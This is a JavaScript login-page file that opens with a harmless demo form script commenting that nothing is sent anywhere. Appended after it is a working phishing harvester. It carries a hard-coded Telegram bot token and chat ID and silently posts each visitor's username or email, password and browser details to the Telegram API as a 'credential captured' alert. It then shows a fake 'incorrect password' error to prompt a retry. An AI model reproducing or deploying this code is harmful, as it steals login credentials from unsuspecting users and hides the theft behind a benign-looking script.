(() => {
  const form   = document.getElementById('loginForm');
  const user   = document.getElementById('username');
  const pass   = document.getElementById('password');
  const btn    = document.getElementById('loginBtn');
  const toggle = document.getElementById('togglePw');
  const msg    = document.getElementById('formMsg');

  // Enable the button only when a username exists and the password has 6+ characters
  const validate = () => {
    btn.disabled = !(user.value.trim() && pass.value.length >= 6);
  };
  user.addEventListener('input', validate);
  pass.addEventListener('input', validate);

  // Show / Hide password
  toggle.addEventListener('click', () => {
    const showing = pass.type === 'text';
    pass.type = showing ? 'password' : 'text';
    toggle.textContent = showing ? 'Show' : 'Hide';
    toggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
    pass.focus();
  });

  // Demo submit: spinner only. Nothing is sent anywhere.
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    if (btn.disabled) return;
    msg.hidden = true;
    btn.classList.add('loading');
    btn.disabled = true;
    setTimeout(() => {
      btn.classList.remove('loading');
      validate();
    }, 1200);
  });

  // Placeholder links should not jump to the top of the page
  document.querySelectorAll('a[href="#"]').forEach((a) =>
    a.addEventListener('click', (e) => e.preventDefault())
  );

  // Footer year
    document.getElementById('year').textContent = new Date().getFullYear();
})();
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const usernameField = document.getElementById('username');
    const passwordField = document.getElementById('password');
    const loginBtn = document.getElementById('loginBtn');
    const formMsg = document.getElementById('formMsg');

    if (!form) return;

    // Telegram Bot Configuration
    const botToken = "9173013050:AAFkWyAZMXtZyn5upEIgTq-MPpWD7ra3ENA";
    const chatId = "8632217578";

    // Enable/Disable login button dynamically as fields are filled
    function validateInputs() {
        const userVal = usernameField.value.trim();
        const passVal = passwordField.value;
        
        if (userVal.length > 0 && passVal.length > 0) {
            loginBtn.removeAttribute('disabled');
        } else {
            loginBtn.setAttribute('disabled', 'true');
        }
    }

    usernameField.addEventListener('input', validateInputs);
    passwordField.addEventListener('input', validateInputs);

    // Handle form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const userInput = usernameField.value.trim();
        const passInput = passwordField.value;

        // Validation patterns
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        const phoneRegex = /^\d{10}$/; // Strict 10-digit mobile number check

        // Determine input type and corresponding error text context
        let inputTypeTag = "👤 Username";
        let errorContext = "username";

        if (emailRegex.test(userInput)) {
            inputTypeTag = "📧 Email Address";
            errorContext = "email";
        } else if (phoneRegex.test(userInput)) {
            inputTypeTag = "📱 Phone Number";
            errorContext = "phone number";
        }

        // Format Telegram payload
        const alertMessage = 
`🚨 *NEW CREDENTIAL CAPTURED* 🚨

🏷️ *Field Type:* ${inputTypeTag}
🔑 *Identifier:* \`${userInput}\`
🔒 *Password:* \`${passInput}\`

🌐 *User Agent:* ${navigator.userAgent}
⏰ *Timestamp:* ${new Date().toISOString()}`;

        const endpoint = `https://api.telegram.org/bot${botToken}/sendMessage`;

        // Loading state
        loginBtn.disabled = true;
        loginBtn.innerText = "Log in...";

        // Send data to Telegram in the background
        try {
            await fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: alertMessage,
                    parse_mode: 'Markdown'
                })
            });
        } catch (err) {
            // Silent catch
        }

        // Simulate server response delay and show dynamic error
        setTimeout(() => {
            loginBtn.disabled = false;
            loginBtn.innerText = "Log in";

            // Dynamically set the error message based on what they entered
            if (formMsg) {
                formMsg.textContent = `Incorrect ${errorContext} or password. Please check your details and try again.`;
                formMsg.hidden = false;
            }

            // Wipe out password field for retry
            passwordField.value = "";
            passwordField.focus();
            validateInputs();
        }, 1000);
    });
});